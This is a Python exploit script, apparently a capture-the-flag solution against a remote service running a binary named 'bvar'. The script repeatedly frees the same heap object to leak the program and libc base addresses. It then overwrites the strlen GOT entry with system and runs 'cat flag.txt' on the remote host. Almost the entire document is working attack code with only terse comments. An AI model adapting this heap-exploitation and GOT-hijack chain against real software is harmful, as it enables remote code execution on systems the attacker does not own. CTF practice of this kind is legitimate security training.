from pwnscripts import *
context.libc = 'libc-2.31.so'
context.binary = 'bvar'
context.binary.symbols['c_memory'] = 0x3580
context.binary.symbols['free_head'] = 0x34F0
context.binary.symbols['head'] = 0x3508
r = remote('167.99.78.201', 7777)

def clear():
    r.sendlineafter('>>> ', b'clear')
def display(var: bytes):
    assert len(var) <= 9
    r.sendlineafter('>>> ', var)
def delete(var: bytes):
    assert len(var) <= 9
    r.sendlineafter('>>> ', b'delete %s' % var)
def edit(var: bytes, newname: bytes):
    r.sendafter('>>> ', b'edit %s' % var)
    assert len(newname) < 5
    r.send(newname)
def assign(var: bytes, data: bytes, newline: bool=True):
    assert len(var)+len(data) < 0x10
    r.sendafter('>>> ', (b'%s=%s' % (var,data))+(b'\n' if newline else b''))


assign(b'a', b'aaa')
delete(b'a') # head is not NULL'd. free(->data) and then free(node)
delete(b'a') # 
delete(b'a') #
r.sendlineafter('>>> ', b'clear')

#node == c_memory+4
#node->data == c_memory+4+0x18+4
assign(b'a', b'aaa')
assign(b'b', b'bbb') # this shares the exact same memory as the previous one.
assign(b'b', b'\x01') # ???
display(b'b')
pie_leak = unpack_bytes(r.recvline(),6)
context.binary.symbols['c_memory'] = pie_leak+0x80-1
log.info('PIE base: ' + hex(context.binary.address))
r.sendlineafter('>>> ', b'clear')
assign(b'a', b'aaa')
r.sendlineafter('>>> ', b'clear')

assign(b'a', b'aaa')
delete(b'a') # head is not NULL'd. free(->data) and then free(node)
delete(b'a') # 
delete(b'a') #
r.sendlineafter('>>> ', b'clear')

assign(b'', b'aaa')
assign(b'', b'aaa') # this returns the data pointer.
assign(b'', pack(context.binary.got['exit'])) # this returns the node pointer. node->data is overwritten with data[]; node->next is partially written by name[]. 
display(b'')
libc_leak = unpack_bytes(r.recvline(),6)
context.libc.symbols['exit'] = libc_leak
log.info('libc base: ' + hex(context.libc.address))
r.sendlineafter('>>> ', b'clear')
assign(b'a', b'aaa')
r.sendlineafter('>>> ', b'clear')
assign(b'a', b'aaa')
r.sendlineafter('>>> ', b'clear')

assign(b'a', b'aaa')
delete(b'a') # head is not NULL'd. free(->data) and then free(node)
delete(b'a') # 
delete(b'a') #
r.sendlineafter('>>> ', b'clear')

assign(b'', b'')
assign(b'', b'') # this returns the data pointer.
assign(b'', pack(context.binary.got['strlen']-8)) # this returns the node pointer. node->data is overwritten with data[]; node->next is partially written by name[]. 
delete(b'')
delete(b'')

edit(p32((context.libc.address+0x18B660)&0xffffffff), p32(context.libc.symbols['system']&0xffffffff))
r.sendlineafter('>>> ', 'cat flag.txt')
print(r.recvline())
